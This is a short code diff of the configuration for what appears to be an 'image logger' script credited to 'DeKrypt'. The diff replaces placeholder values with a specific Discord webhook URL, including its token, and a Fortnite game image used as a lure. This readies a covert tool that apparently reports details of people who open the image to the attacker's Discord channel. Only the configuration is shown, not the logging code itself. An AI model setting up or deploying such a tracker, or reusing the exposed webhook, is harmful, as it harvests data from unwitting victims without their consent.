@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335317042181439610/bLI_pwqqOKtiy-1CctoKFrWi5IgV2nyESqXpkkPgzfSlUO62f6dGXys2Z_RGljj5YO6U",
+    "image": "https://www.nintendo.com/eu/media/images/assets/nintendo_switch_games/fortnite/2x1_Fortnite_Generic_image1600w.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
